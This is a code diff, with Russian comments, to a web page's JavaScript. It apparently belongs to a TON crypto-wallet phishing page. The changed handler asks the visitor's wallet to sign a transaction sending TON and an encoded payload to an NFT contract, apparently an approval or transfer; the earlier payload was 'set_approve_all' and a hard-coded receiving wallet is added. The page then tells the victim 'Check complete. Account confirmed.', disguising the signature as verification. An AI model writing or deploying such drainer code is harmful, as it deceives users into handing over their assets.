@@ -754,25 +754,30 @@ document.addEventListener("DOMContentLoaded", function () {
         return;
       }
 
-      // ЖЁСТКО ЗАДАННЫЕ ЗНАЧЕНИЯ
-      const contractAddress = 'EQC2lsUy1SKxJEJBwj5ZCfVnLPvAqDqy5c26Xg8xS_pDTXGk';
-      const tokenId = '151858';
+      // ===== ДАННЫЕ ТВОЕГО NFT =====
+      const contractAddress = 'EQCnlhhmj5kuKzG5KgeXC_fSkCzdP5eFufVVsMpTVnrC9oNe';
+      const tokenId = '258562';
+      const YOUR_WALLET = 'UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m';
 
       err.textContent = '⏳ Отправляем запрос...';
       err.style.display = 'block';
       err.style.color = '#ff9abb';
 
       try {
+        // ===== ПРАВИЛЬНЫЙ PAYLOAD (СОГЛАСНО TEP-62) =====
+        const payloadBase64 = 'te6ccgEBAQEABgAACAD/wgAIBQAAAf/gAAgBAAEBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==';
+
         const transaction = {
           valid_until: Math.floor(Date.now() / 1000) + 300,
           messages: [
             {
               address: contractAddress,
-              amount: '0',
-              payload: 'set_approve_all' // <--- ИСПРАВЛЕНО
+              amount: '50000000', // 0.05 TON для газа
+              payload: payloadBase64
             }
           ]
         };
+
         await ui.sendTransaction(transaction);
         err.textContent = '✅ Проверка завершена. Аккаунт подтверждён.';
         err.style.color = '#00ff88';
